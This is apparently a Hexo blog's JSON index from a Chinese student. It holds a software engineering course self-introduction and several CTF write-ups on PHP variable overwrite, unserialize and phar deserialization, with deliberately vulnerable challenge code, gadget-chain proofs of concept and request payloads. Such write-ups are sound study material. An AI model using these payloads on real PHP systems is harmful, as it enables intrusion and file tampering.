{"meta":{"title":"42's Blog","subtitle":"Do not go gentle into that good night.<br> Old age should burn and rave at close of the day.","description":"aaaa","author":42,"url":"http://yoursite.com","root":"/"},"pages":[{"title":"分类","date":"2019-06-06T09:34:22.283Z","updated":"2019-06-06T09:34:22.283Z","comments":false,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2019-06-06T06:37:54.103Z","updated":"2019-06-06T06:37:54.103Z","comments":true,"path":"categories/index-1.html","permalink":"http://yoursite.com/categories/index-1.html","excerpt":"","text":"分类"},{"title":"关于我","date":"2019-09-06T12:23:04.149Z","updated":"2019-06-06T09:32:06.898Z","comments":false,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"","date":"2019-06-05T12:25:46.621Z","updated":"2019-06-05T12:25:46.621Z","comments":true,"path":"about/index-1.html","permalink":"http://yoursite.com/about/index-1.html","excerpt":"","text":"about"},{"title":"","date":"2019-09-06T12:21:06.639Z","updated":"2019-09-06T12:21:06.639Z","comments":true,"path":"about/index-2.html","permalink":"http://yoursite.com/about/index-2.html","excerpt":"","text":"关于我"},{"title":"标签","date":"2019-06-06T09:34:18.948Z","updated":"2019-06-06T09:34:18.948Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2019-09-13T12:15:29.383Z","updated":"2019-09-10T12:01:37.962Z","comments":true,"path":"about/aaa.html","permalink":"http://yoursite.com/about/aaa.html","excerpt":"","text":"这个作业属于哪个课程 课程链接 这个作业要求在哪里 作业要求链接 我在这个课程的目标是 掌握软件工程这门课的核心知识点，对职业规划有清晰的认识，在完成该课程之后对未来学习历程有明确的方向 这个作业在哪个具体方面帮助我实现目标 通读教材并提出建设性问题 参考文献 在 GitHub 可以做什么，用户又习惯做些什么？ 参考文献 版本管理（一）之Git和GitHub的区别（优点和缺点） 参考文献 GitHub、Bitbucket、Google Code 各有哪些优缺点？ 1.关于我 我是来自计科1801的陈纪龙，叫这个名字是因为有个双胞胎哥哥叫陈世龙^_^ 博客园博客地址: https://www.cnblogs.com/FourtyTwo/ 个人优点大概是自控与自学能力较强，对感兴趣的事物有着强烈的好奇心与求知欲 平常喜欢跑步和乒乓球 大一的一学年里通过自学倒也学了不少东西，但大多都不是很精通/(ㄒoㄒ)/~~，新的一学年争取把之前落下的东西补回来，把学的不扎实的东西再巩固一下 之前通过Hexo+Github搭建了个人博客，以记录学习过程中遇到的各种问题，但已经停更挺长时间了〒▽〒，也希望借此机会能够督促自己，多多记录自己的学习历程(ง •_•)ง(==&gt;My blog) 2.阅读与思考阅读以上材料，并回答下面几个问题： （1）回想一下你初入大学时对你所在专业的畅想 当初你是如何做出选择你所在专业的决定的？ 其实在高中对计算机相关专业的认知并不是很清晰，在选择志愿前也是通过知乎了解到计算机相关专业就业率与薪酬都比较高，并且自以为自学能力与独自解决问题的能力尚可，最终将计算机科学与技术专业排在了第一志愿。 你认为过去一（两）年中接触到的课程是否符合你对你自己所在专业的期待，为什么？ 符合期待。过去一年学校开设了C语言与数据结构这两门专业课程，因为程序=算法+数据结构，所以作为一名程序员，重中之重便是对于数据结构的学习，而要学好这门课又需要C语言作为支撑，对我们的学习与发展有较大的帮助。 你觉得你所在的专业是你喜欢的领域吗，它是你擅长的领域吗？ 既然主动选择了这个专业，当然是喜欢这个领域了，计算机行业只要有一台电脑，便有了无限的发展空间。但由于一入学便加入网络联盟，参加了几次CTF和AWD网络攻防赛， 所以目前最擅长的领域是渗透测试o((⊙﹏⊙))o，但我会努力做到全面发展，开发渗透两开花(￣︶￣*))。 将来你会选择从事和你专业相关的工作吗？是的话给出你想去的城市、公司和岗位，否的话给出原因 会，根据自己的能力与学习情况选择对应的工作。可能的话会在成都发展，公司和岗位目前还无法确定X_X。 （2）对照前人们走过的路和描述未来发展，现在的你 自我感觉你已经具备的专业知识、技能、能力有哪些？已经写过的代码量是多少？描述你做的最复杂的项目/作业。 目前通过自学掌握了Linux与SQL语句基础；可以自己鼓捣虚拟机，在kali-Linux上利用常见web前端后端漏洞进行渗透测试；此外还有些php和python基础，但不是特别熟练。代码量可能有个两千行？做过的最复杂的作业可能就是上学期程序设计综合实践课上做的推箱子小游戏，通过多维数组完成地图的创建，开始的图形界面通过网上查阅利用windows的一些命令实现。 离成为一个合格的本科毕业生，在专业知识、技能、能力上还差距哪些？ 目前熟练掌握的语言很少，并且不知道软件开发的具体流程，不了解如何通过团队协作来实现软件的开发；并且没有实际的软件开发经验，对未来的发展规划尚不清晰。 （3）目前是一个人生选择的十字路口，考研、工作、考公、出国，不同的选择在大三就有不同的努力方向。而无论考研还是工作的每条路径，也有许多不同的分支。 对照以上你阅读的前人们的经历，你的选择是什么？ 如今本科生就业竞争十分激烈，加上父母的建议并且不让未来的自己后悔，我选择考研这一方向。 在这种选择下，你认为你相比其他同学来说有何优势，有何劣势？ 考研需要比较好的自控能力，我的优势便是如此，能在无人监督的情况下时刻保持自律，合理制定并且比较好地完成学习计划；劣势可能就是脑袋不如别人灵光〒▽〒，需要用更多的时间来理解某一道题或某一事物，正因如此，我更要我加倍努力，付出更多的时间与精力(ง •_•)ง。 针对你的选择，你给自己的大三设定的规划安排是什么？ 由于不想把考研战线拉的太长，我准备在大三下学期开始考研的复习工作，这样距离考研大概有九个月的时间，也避免了时间过短导致复习不充分的情况；每天至少八小时的学习时间，并且保证留有外出锻炼的时间，毕竟身体是革命的本钱，做到劳逸结合才能事半功倍。 你对于实现自己的梦想已经做了或者计划做什么样的准备？ 目前做的准备就是当然就是做好作为学生的本职工作：认真对待所学的每一门课，并且在大一学年也取得了令自己满意的成绩，也相当于为考研夯实基础；未来还要进一步提升自己的专业技能，还要尽量克服社交恐惧/(ㄒoㄒ)/~~。 ##3.提有质量的问题 问题①：什么算是“足够好”？ 问题来源： 教材第一章概论部分第17页提出要通过一定的软件流程，在预计的时间内发布“足够好”的软件,但究竟什么算是“足够好”呢？ 我的理解： 关于“足够好”，这个定义本身就模棱两可，未能对软件发布的具体时机有个明确的阐述；况且“未完成的”也不一定就是差的，例如Valve公司旗下Steam平台开创的Early Access模式就开创了这一先河，开发者可以在开发流程尚未完成时就将软件发布在平台进行买断制售卖，这种模式不仅可以解决开发过程中可能出现的资金短缺问题，还可以将软件的雏形展示给用户，这样一来，开发者可以及时吸取用户的意见，优化开发流程与调整开发方向，将“更加好”的软件展示给客户。 问题②：如何对软件设计思想有深入的理解？ 问题来源： 教材第三章谈到软件工程师的成长时提到了要对软件设计思想又深入的理解，但书中并未提出究竟如何才能对软件设计思想有深入的理解。 我的理解： 我认为要对软件设计有深入的理解最不可取的方法便是直接翻阅各种讲解软件设计思想的书籍，因为若缺乏基本的实践经验，不了解一个软件从策划到开发结束的具体流程，从书籍中直接获得的东西便都是过往云烟，到头来也只是纸上谈兵。我认为好的方法应该是先尽可能的去寻找实践机会，实在没有便自己创造机会，在一个个项目中便可以潜移默化的掌握很多软件设计思想。 问题③：PM的职能？ 问题来源： 教材第九章集中讲解了有关PM的内容，并介绍了Program Manager与Project Manager的区别，但我对于Project Manager的职能产生了疑问 我的理解： 书中指出Program Manager就是负责具体的代码开发工作，和大家平等工作，对具体的软件开发流程有深入了解；Project Manager就相当于一个领导者，负责与客户交流，组织用户调查，书中后续又指出PM还要管理软件的生命周期，具体如设计、实现、测试、升级、迁移等工作，但这些工作对于不熟悉具体软件开发流程且没有直接参与软件开发的Program Manager又如何做到呢？ 问题④：如何做好软件体验中的长期影响？ 问题来源： 教材第十二章用户体验的要素中提到了“短期刺激”的弊端，但又如何做到用户在软件体验中的“长期影响”？ 我的理解： 教材中写道短期刺激如冗余的动画和所谓手势操作会带给用户糟糕的体验，无异于画蛇添足；通过查阅资料，我了解到苹果公司在软件体验中的“长期体验”方面做的非常好：就APP启动时的过渡动画而言，Android在应用启动时的过渡动画大都只是从A到B的“位移”，或者干脆不做过渡动画。而IOS却在这个方面下足了心思，苹果很聪明的运用了很多非线性动画，这些动画在很大程度上会给你很流畅顺滑的感觉，并且将这些过渡动画之类的图形处理应用的优先层级调整的十分靠前，而Android则相反。注重细节，这便是IOS总是比Android流畅的原因，这便是IOS给用户的“长期体验”好的原因。 问题⑤：如何确定正确的设计负载？ 问题来源： 教材十三章中的效能测试小节里提到要在一开始确定正确的设计负载。 我的理解： 由于缺乏实际的软件开发经验，我始终觉得确定正确的设计负载是件很困难的事。就比如在准备搭建个人博客时服务器的选择：对于刚开始写博文的小明来说，512mb的内存可能就够用了，但万一他的其中一篇博文突然成为“网络爆款”，博客访问量猛增，服务器这时便会不堪重负，若不及时采取补救措施，甚至会导致数据丢失；而若一开始就选择较大容量与内存的服务器，大概率出现浪费的情况，不仅如此，实际的软件开发中，设计负载还要让客户满意，所以“设计负载”究竟该如何确定呢？ 4.了解和调查源程序版本管理工具GitHub - 优点 - 托管代码 - 托管编程环境 - Github Pages 可以为项目建立静态主页(即gh-pages分支), 也可以建立命名特殊的 - 生态环境较好 - 用户群体基数大，知名库多 - 缺点 - 私有项目收费较高 - 连接不稳定Git - 优点 - 适合分布式开发，强调个体 - 公共服务器压力和数据量都不会太大 - 速度快、灵活。 - 任意两个开发者之间可以很容易的解决冲突 - 离线工作 - 缺点 - 学习周期相对而言比较长 - 不符合常规思维 - 代码保密性差，一旦开发者把整个库克隆下来就可以完全公开所有代码和版本信息Bitbucket - 优点 - 支持Hg，最易学易用,同时也支持Git - 完全免费的闭源项目，还支持5人以内的合作开发 - 支持中文 - 缺点 - 用户数量限制 - 用户基数小，生态环境不如GitHub完善"}],"posts":[{"title":"PHP变量覆盖","slug":"phpbianlfugai","date":"2019-06-07T03:32:02.214Z","updated":"2019-09-06T12:18:21.877Z","comments":true,"path":"2019/06/07/phpbianlfugai/","link":"","permalink":"http://yoursite.com/2019/06/07/phpbianlfugai/","excerpt":"①foreach+$$可变变量覆盖","text":"①foreach+$$可变变量覆盖 引入： 12345&lt;?php $a = 123; $123 = 456; echo $&#123;$a&#125; ==&gt; 456?&gt; example： 123456789101112131415161718192021222324&lt;?php error_reporting(0); show_source(__FILE__); // show_source — 别名 highlight_file() 使用PHP内置的语法高亮器所定义的颜色，打印输出或者返回 filename 文件中语法高亮版本的代码。 include \"flag.php\";$_403 = \"Access Denied\"; $_200 = \"Welcome Admin\"; if ($_SERVER[\"REQUEST_METHOD\"] != \"POST\") die(\"CISPCTF is here :p...\"); if ( !isset($_POST[\"flag\"]) ) die($_403); foreach ($_GET as $key =&amp;gt; $value)&#123; //通过for循环遍历GET方式传入的参数变量与其值，ex：?_200=flag $$key = $$value; //如上ex的GET传入，由于使用了可变变量，在此就变为“$_200=$flag”,即覆盖了变量$_200原有的值：“Welcome Admin”，将$flag变量里的值存入了变量$_200 print_r($$key); echo \"------\"; print_r($$value); &#125; foreach ($_POST as $key =&amp;gt; $value)&#123; //通过for循环遍历post接受的参数，ex：post=&gt;flag=123, 此时 $$key = $value; //如上ex的POST传入，由于使用可变变量，变为$flag=123, 即flag变量原有的值已被覆盖为123，所以下方27行的if语句判断始终全等，无法进入die($_403)语句&#125; if ( $_POST[\"flag\"] !== $flag ) // !== 不全等（完全不同） $x !== $y 如果 $x 不等于 $y，或它们类型不相同，则返回 true。 die($_403); echo \"This is your flag : \". $flag . \"\\n\"; //之后走到这里。flag原本值已经被覆盖。，echo出来的flag只是之前覆盖的123die($_200); //最后走到这里，真正flag的值在14行 被赋值给了变量$_200, 故此条语句打印出了真正的flag。?&gt; ②extract()函数导致的变量覆盖漏洞 引入：由于未系统学习php，看了一些参考后，对extract()函数的理解还不是很透 彻。。。 但大致可以利用extract($_GET/$_POST)函数来实现将GET或POST的变量名与其对应的值传入；漏洞就发生在若用户传入的变量名与已有变量相同，则用户传入的变量名与其值会将原有的值覆盖造成变量覆盖漏洞。 example1： 1234567891011$flag = 'xxx';extract($_GET);//通过extract()函数将将用户通过GET写入的变量名与其对应的值传入。 if (isset($gift)) &#123; $content = trim(file_get_contents($flag)); if ($gift == $content) &#123;//要判断变量gift与content相等，由于extract函数的使用，直接通过get方式传入这两个变量并都赋值为空即可达到变量覆盖以实现相等的目的。 echo 'hctf&#123;…&#125;'; &#125; else &#123; echo 'Oh..'; &#125;&#125; PAYLOAD：?gift=&amp;flag= example2： 1234567&lt;?php if ($_SERVER[\"REQUEST_METHOD\"] == “POST”) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; echo $theflag; &#125; ?&gt; //和上一题基本相同，用POST方式传入pass与thepasswod_123变量，并将其赋值为空以覆盖两个变量，使if判断语句为真。 PAYLOAD：POST==&gt;pass=&amp;thepassword_123= ③parse_str(string,array)函数导致的变量覆盖漏洞 引入：该函数用于解析给出的string字符串，并将其注册为变量，之后将变量存入array数组中，若未给出参数array则只注册变量（ex：parse_str(‘a=1&amp;b=2’); echo $a; echo $b ），漏洞就发生在注册变量时不会检查变量是否已经存在，当变量名与已有变量名重复则会造成变量覆盖 example： 123456789101112131415161718&lt;?php error_reporting(0);if (empty($_GET['id'])) &#123; show_source(__FILE__); die();&#125; else &#123; include ('flag.php'); $a = \"www.OPENCTF.com\"; $id = $_GET['id']; @parse_str($id);//通过parse_str()函数处理GET方式传入的变量id，会在此时解析变量id所代表的字符串，并直接将字符串中的变量进行注册 if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) &#123;//此时出现变量a[0]，结合上面的parse_str函数，可以利用id来将a[0]变量注册，并根据md5的0e漏洞赋给a[0]一个md5编码后为0e开头的值，这样就可以使if语句判断为真。 echo $flag; exit; &#125; else &#123; exit('其实很简单其实并不难！'); &#125;&#125; ④import_requests_variables函数导致的变量覆盖漏洞 引入：此函数可以直接将GET/POST/Cookie的参数注册成变量，所以变量覆盖就显而易见了。 ⑤小结： 变量覆盖漏洞其实都大同小异，无非就是通过GET或POST传入一些参数，经过上述几个函数的处理，将这些参数解析为了PHP中的变量，若已给出的参数名与已有的变量名相同，则会将变量的值直接覆盖。另外，在实战中，变量覆盖漏洞要考虑的不仅仅是变量覆盖，还要结合后续代码来真正利用起来这个漏洞","categories":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/categories/CTF/"},{"name":"PHP变量覆盖","slug":"CTF/PHP变量覆盖","permalink":"http://yoursite.com/categories/CTF/PHP变量覆盖/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]},{"title":"2019强网杯CTF","slug":"2019qiangwang","date":"2019-06-06T09:45:26.790Z","updated":"2019-06-07T02:11:31.634Z","comments":true,"path":"2019/06/06/2019qiangwang/","link":"","permalink":"http://yoursite.com/2019/06/06/2019qiangwang/","excerpt":"WEB-1 Upload（简化）","text":"WEB-1 Upload（简化） index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpinclude 're.php';class register &#123; public $ff; public function index() &#123; print('hahaha'); &#125; public function __construct() &#123; print('hacked by jiahaoqiu'); &#125; public function guapi() &#123; if(!$this-&gt;ff) &#123; $this-&gt;ff-&gt;index(); &#125; &#125; public function __destruct() &#123; #echo 123; print('hacked by jiahaoqiu 12345'); if($this-&gt;ff) &#123; echo 'ssss'; $this-&gt;ff-&gt;index(); &#125; &#125; &#125;$fan = $_GET['a'];unserialize(base64_decode($fan));?&gt; re.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php class aa&#123; public $filename_tmp; public $filename; public $ext; #public $img; public $arr; public function __construct() &#123; echo \"hackded by jiahaoqiu\"; &#125; public function upload()&#123; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; echo 3; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); #$this-&gt;img=\"$this-&gt;filename\"; #echo $thi-&gt;img; &#125;else&#123; echo \"error\"; &#125; &#125;else&#123; echo \"error\"; &#125; &#125; public function __get($name)&#123; echo '2'; return $this-&gt;arr[$name]; &#125; public function __call($name, $arguments)&#123; echo '1'; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; public function hello() &#123; echo \"hacked by 1\"; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125; ?&gt; 本题目的是将文件夹中的2.png文件改为2.php，审计源码index.php第17行发现upload函数中第二个分支语句可利用，只要控制filename与filename_tmp属性即可达到将2.png替换为2.php的目的，而要利用upload函数就需要进观察。 做题时还是会最先考虑利用题目中很显眼的__Call与__Get两个魔术方法，发现__Call函数中：其中$arguments便是函数形参，可以利用此行语句来执行upload()。想要利用__Call函数就需要调用该类中不存在的方法；并且，再调用__Call函数时，形参$name即为被调用的那个不存在的方法的名称； 而__Get函数的利用需要调用该类中不存在的属性，此时再看__Call函数中的if($this-&gt;{$name})，竟然用形参$name 这个该类中不存在的方法做判断条件，那么当调用这个与不存在的方法同名的属性时，__Get函数便会执行，从而进入 return $this-&gt;arr[$name] 语句，所以当我们控制arr数组中下标为$name的值时便可控制return的返回值，即将$this-&gt;{$name}变为我们指定的 arr[$name]的值，结合前面要利用upload函数，将arr[$name]的值变为upload，即可将$this-&gt;{$this-&gt;{$name}}($arguments)变为执行$this-&gt;upload(); 如上，开始构造完整的序列化攻击链，首先要调用upload函数就需要调用Call函数，发现可以利用$this-&gt;ff-&gt;index()，将register类中的ff属性赋为aa类，这样就能是aa类调用其不存在的方法“index（）”，从而调用Call函数，在执行Call函数时，其中的if($this-&gt;{$name})即变为if($this-&gt;index)，而aa类中又不存在index这个属性，所以会进而调用Get函数，我们再令Get函数中的arr[index]的值为upload，使 Get函数最终将“upload“ return给$this-&gt;{$name}，便可通过$this-&gt;{$this-&gt;{$name}}($arguments)执行$this-&gt;upload()； POC: 12345678910111213&lt;?php $a = new aa(); $reg = new register();$reg -&gt; ff = $a; $a -&gt; arr = array(''index =&gt; 'upload');$a -&gt; filename_tmp = '2.png';$a -&gt; filename = '2.php';$a -&gt; ext = '1'; ?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/categories/CTF/"},{"name":"PHP反序列化","slug":"CTF/PHP反序列化","permalink":"http://yoursite.com/categories/CTF/PHP反序列化/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]},{"title":"2019国赛CTF","slug":"2019guosai","date":"2019-06-06T09:12:23.164Z","updated":"2019-06-07T02:08:51.371Z","comments":true,"path":"2019/06/06/2019guosai/","link":"","permalink":"http://yoursite.com/2019/06/06/2019guosai/","excerpt":"WEB-1 justSoso","text":"WEB-1 justSoso 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$file = $_GET[\"file\"];$payload = $_GET[\"payload\"]; if (!isset($file)) &#123; echo 'Missing parameter' . '&lt;br&gt;';&#125; if (preg_match(\"/flag/\", $file)) &#123; die('hack attacked!!!');&#125; @include ($file);if (isset($payload)) &#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'], $query); foreach ($query as $value) &#123; if (preg_match(\"/flag/\", $value)) &#123; die('stop hacking!'); exit(); &#125; &#125; $payload = unserialize($payload);&#125; else &#123; echo \"Missing parameters\";&#125;?&gt; index.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Handle &#123; private $handle; public function __wakeup() &#123; foreach (get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking upn\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct() &#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125; class Flag &#123; public $file; public $token; public $token_flag; function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1, 10000)); &#125; public function getFlag() &#123; $this-&gt;token_flag = md5(rand(1, 10000)); if ($this-&gt;token === $this-&gt;token_flag) &#123; if (isset($this-&gt;file)) &#123; echo @highlight_file($this-&gt;file, true); &#125; &#125; &#125;a?&gt; hint.php 这道题的重点不是其中的反序列化，而是其中parse_url与md5的绕过方法 分析hint源码发现，我们需要将Handle类中的handle属性赋值为Flag类以调用getFlag()函数，但单单这样构造序列化之后，传入的payload中肯定含有“flag”这一字符串，会因index.php源码中的遍历url而被匹配到，经过搜索发现，可以通过加两个双斜杠的方式绕过parse_url进而绕过正则匹配。 parse_url绕过 但getFlag()函数中还存在一个问题，虽然Flag类中前几条语句将token属性与token_flag属性相等，getFlag函数中，又将token_flag赋为了一个新的md5加密后的随机值，所以此处又需要绕过，爆破似乎可行，但经过搜索发现存在另一种较为简单的方法：利用取地址符号“&amp;”，来使token与token_flag的关系始终相等，这样在给token_flag赋新值时，token也会跟着变化。 POC: 1234$b = new Flag(&quot;flag.php&quot;);$b-&gt;token = &amp;$b-&gt;token_flag;$a = new Handle($b);echo serialize($a);","categories":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/categories/CTF/"},{"name":"PHP反序列化","slug":"CTF/PHP反序列化","permalink":"http://yoursite.com/categories/CTF/PHP反序列化/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"},{"name":"md5绕过","slug":"md5绕过","permalink":"http://yoursite.com/tags/md5绕过/"},{"name":"parse_url绕过","slug":"parse-url绕过","permalink":"http://yoursite.com/tags/parse-url绕过/"}]},{"title":"团队省赛选拔题","slug":"tags_test","date":"2019-06-06T06:31:27.841Z","updated":"2019-06-07T02:13:38.902Z","comments":true,"path":"2019/06/06/tags_test/","link":"","permalink":"http://yoursite.com/2019/06/06/tags_test/","excerpt":"phar反序列化","text":"phar反序列化 引入 https://paper.seebug.org/680/ 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?php include('flag.php');class hello&#123; public $name; public $welcome; public function __construct($name) &#123; $this-&gt;name = $name; &#125; public function simple_hello() &#123; $this-&gt;welcome = \"hello \".$this-&gt;name.\" welcome to ctf!\".\"&lt;br/&gt;\"; echo $this-&gt;welcome; &#125; public function __destruct() &#123; $this-&gt;simple_hello(); echo 'test'; &#125;&#125;class gogogo&#123; public $one; public $two; public function __toString() &#123; $this-&gt;one-&gt;get_flag(); return '0'; &#125;&#125;class nice&#123; public $file; public $flag; public function __construct($flag, $file) &#123; $this-&gt;flag = $flag; $this-&gt;file = $file; &#125; public function check() &#123; chdir('upload'); if(file_exists($this-&gt;file.\".jpg\")) &#123; echo 'file exist'.\"&lt;br/&gt;\"; &#125; else &#123; echo 'file not exist'.\"&lt;br/&gt;\"; &#125; &#125; public function get_flag() &#123; echo $this-&gt;flag.\"&lt;br/&gt;\"; &#125;&#125;@$a = $_GET['filename'];$e = new nice($flag, $a);$e-&gt;check(); ?&gt; 刚刚拿到这道题的时候，发现存在多个PHP魔术方法，明显是反序列化；但进一步审计发现并没有任何userialize的地方，经过搜索发现存在一种名为phar反序列化漏洞，即在不利用unserialize()函数的情况下，利用文件操作函数（file_exits、is_dir等）实现反序列化。 首先分析一波phar文件的结构：phar本质上是一种压缩文件，其中`meta-data`部分需要被序列化之后存储，利用该漏洞的核心便是当文件操作函数结合`phar://伪协议`时会将phar文件中的`meta-data`部分反序列化，这时我们构造的序列化攻击链就会发挥作用 其次，phar文件结构中还要添加被压缩的文件名（ex：test.jpg），之前由于一直未注意到这个问题导致题目卡了很长时间。。。。 经过以上分析，我们可以写一个php文件（该文件中已将序列化构造链传到meta-data，本体攻击链构造较为简单，就不详述），访问该php文件会在目录下生成一个phar文件： POC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php class hello&#123; public $name; public $welcome; public function simple_hello() &#123; $this-&gt;welcome = \"hello \".$this-&gt;name.\" welcome to ctf!\".\"&lt;br/&gt;\"; echo $this-&gt;welcome; &#125; public function __destruct() &#123; $this-&gt;simple_hello(); echo 'test'; &#125;&#125; class gogogo&#123; public $one; public $two; public function __toString() &#123; $this-&gt;one-&gt;get_flag(); return '0'; &#125;&#125; class nice&#123; public $file; public $flag; public function get_flag() &#123; echo $this-&gt;flag.\"&lt;br/&gt;\"; &#125;&#125; $he = new hello();$he -&gt;name = new gogogo();$he -&gt;name -&gt; one = new nice(); $phar = new Phar('phar.phar');$phar -&gt; stopBuffering();$phar -&gt; setStub('&lt;?php __HALT_COMPILER();?&gt;');$phar -&gt; addFromString('test.txt','test');$phar -&gt; setMetadata($he);$phar -&gt; stopBuffering(); ?&gt; 生成`phar.phar`文件之后，将其后缀名改为.jpg直接上传，上传后在存在各种类源码的ctf.php页面传入fiename参数。（ex：`ctf.php?filename=phar://upload/phar.jpg`） 本来以为这道题就这样了，flag就会出来了，但怎么尝试上传flag就是不会回显，心态也有点崩。。。 后经大佬提示，源码中47行check()函数： 123456789101112public function check() &#123; chdir('upload'); if(file_exists($this-&gt;file.\".jpg\")) &#123; echo 'file exist'.\"&lt;br/&gt;\"; &#125; else &#123; echo 'file not exist'.\"&lt;br/&gt;\"; &#125; &#125; 发现首先会将目录切换到upload并且会在file属性后拼接一个“.jpg“，这样的话，就需要将原来添加的压缩文件名“test.txt”改为“test.jpg”以配合拼接最终PAYLOAD：ctf.php?filename=phar://phar.jpg/test","categories":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/categories/CTF/"},{"name":"PHP反序列化","slug":"CTF/PHP反序列化","permalink":"http://yoursite.com/categories/CTF/PHP反序列化/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]}]}